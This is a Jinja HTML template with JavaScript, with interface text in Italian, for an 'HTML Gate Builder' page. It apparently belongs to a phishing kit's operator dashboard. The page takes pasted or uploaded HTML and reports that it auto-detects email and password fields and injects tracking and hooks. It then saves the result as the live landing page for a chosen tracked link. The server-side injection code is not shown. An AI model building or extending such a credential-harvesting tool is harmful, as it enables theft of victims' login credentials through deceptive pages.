{% extends "base.html" %}

{% block content %}
<div class="row" style="display: flex; gap: 30px; flex-wrap: wrap;">
    <!-- Left: Upload & Config -->
    <div style="flex: 1; min-width: 350px;">
        <div class="card">
            <h2 style="margin-bottom: 20px;"><i class="fas fa-file-code"></i> HTML Gate Builder</h2>
            <p style="color: var(--text-sec); margin-bottom: 20px;">
                Carica il tuo HTML personalizzato. Il sistema rileverà automaticamente i campi email/password
                e inietterà il tracking completo.
            </p>

            <form id="architectForm">
                <div class="form-group" style="margin-bottom: 15px;">
                    <label>Link di Destinazione</label>
                    <select id="link_id" name="link_id" required>
                        <option value="">-- Seleziona Link --</option>
                        {% for link in links %}
                        <option value="{{ link.id }}">{{ link.slug }} → {{ link.destination }}</option>
                        {% endfor %}
                    </select>
                </div>

                <div class="form-group" style="margin-bottom: 15px;">
                    <label>HTML Personalizzato</label>
                    <textarea id="customHtml" name="custom_html" rows="15"
                        placeholder="Incolla qui il tuo HTML completo (inclusi <html>, <head>, <body>)..."
                        style="font-family: monospace; font-size: 0.9rem;" required></textarea>
                    <small style="color: var(--text-sec); display: block; margin-top: 5px;">
                        Oppure <label for="fileUpload" style="color: var(--accent); cursor: pointer;"><u>carica un file
                                HTML</u></label>
                    </small>
                    <input type="file" id="fileUpload" accept=".html" style="display: none;">
                </div>

                <div class="form-group" style="margin-bottom: 20px;">
                    <label style="display: flex; align-items: center; gap: 10px;">
                        <input type="checkbox" id="autoInject" name="auto_inject" checked>
                        <span>Auto-inietta tracking e hooks (consigliato)</span>
                    </label>
                </div>

                <button type="submit" class="btn" style="width: 100%;">
                    <i class="fas fa-magic"></i> Genera Anteprima
                </button>
            </form>
        </div>

        <!-- Detection Report -->
        <div id="detectionReport" class="card" style="margin-top: 20px; display: none;">
            <h5><i class="fas fa-search"></i> Campi Rilevati</h5>
            <ul id="detectedFields" style="margin: 10px 0; padding-left: 20px;"></ul>
        </div>
    </div>

    <!-- Right: Preview -->
    <div style="flex: 2; min-width: 400px;">
        <div class="card" style="height: 100%; display: flex; flex-direction: column;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h5>Anteprima Live</h5>
                <div style="display: flex; gap: 10px;">
                    <button class="btn-sm btn-outline" id="saveBtn" style="display: none;" onclick="saveGate()">
                        <i class="fas fa-save"></i> Salva & Attiva
                    </button>
                </div>
            </div>

            <div id="loading" style="display: none; text-align: center; padding: 50px;">
                <i class="fas fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--accent);"></i>
                <p style="margin-top: 15px; color: var(--text-sec);">Processamento HTML...</p>
            </div>

            <iframe id="previewFrame"
                style="width: 100%; flex: 1; border: 1px solid var(--border); border-radius: 8px; background: #fff;"></iframe>

            <textarea id="processedHtml" style="display: none;"></textarea>
        </div>
    </div>
</div>

<script>
    // File Upload Handler
    document.getElementById('fileUpload').addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById('customHtml').value = e.target.result;
            };
            reader.readAsText(file);
        }
    });

    // Form Submit
    document.getElementById('architectForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const customHtml = document.getElementById('customHtml').value;
        const linkId = document.getElementById('link_id').value;
        const autoInject = document.getElementById('autoInject').checked;
        
        if (!customHtml || !linkId) {
            alert('Compila tutti i campi!');
            return;
        }

        const loading = document.getElementById('loading');
        const frame = document.getElementById('previewFrame');
        const saveBtn = document.getElementById('saveBtn');
        const detectionReport = document.getElementById('detectionReport');
        
        loading.style.display = 'block';
        frame.style.display = 'none';
        saveBtn.style.display = 'none';
        detectionReport.style.display = 'none';

        try {
            const formData = new FormData();
            formData.append('link_id', linkId);
            formData.append('custom_html', customHtml);
            formData.append('auto_inject', autoInject ? 'true' : 'false');

            const res = await fetch('/dashboard/architect/process', {
                method: 'POST',
                body: formData
            });

            const data = await res.json();

            if (data.html) {
                document.getElementById('processedHtml').value = data.html;
                
                // Show detection report
                if (data.detected_fields && data.detected_fields.length > 0) {
                    const fieldsList = document.getElementById('detectedFields');
                    fieldsList.innerHTML = data.detected_fields.map(f => 
                        `<li style="color: var(--accent);">${f}</li>`
                    ).join('');
                    detectionReport.style.display = 'block';
                }

                // Render in iframe
                const blob = new Blob([data.html], { type: 'text/html' });
                frame.src = URL.createObjectURL(blob);
                frame.style.display = 'block';
                saveBtn.style.display = 'inline-flex';
            } else {
                alert('Errore: ' + (data.error || 'Unknown'));
            }
        } catch (err) {
            alert('Request failed: ' + err);
        } finally {
            loading.style.display = 'none';
        }
    });

    async function saveGate() {
        const linkId = document.getElementById('link_id').value;
        const html = document.getElementById('processedHtml').value;

        if (!html) return;

        const formData = new FormData();
        formData.append('link_id', linkId);
        formData.append('html', html);

        if (confirm('Questo sostituirà la landing page per questo link. Continuare?')) {
            const res = await fetch('/dashboard/architect/save', {
                method: 'POST',
                body: formData
            });
            const data = await res.json();
            if (data.success) {
                alert('Landing page salvata con successo!');
                window.location.href = '/dashboard';
            } else {
                alert('Errore: ' + data.error);
            }
        }
    }
</script>
{% endblock %}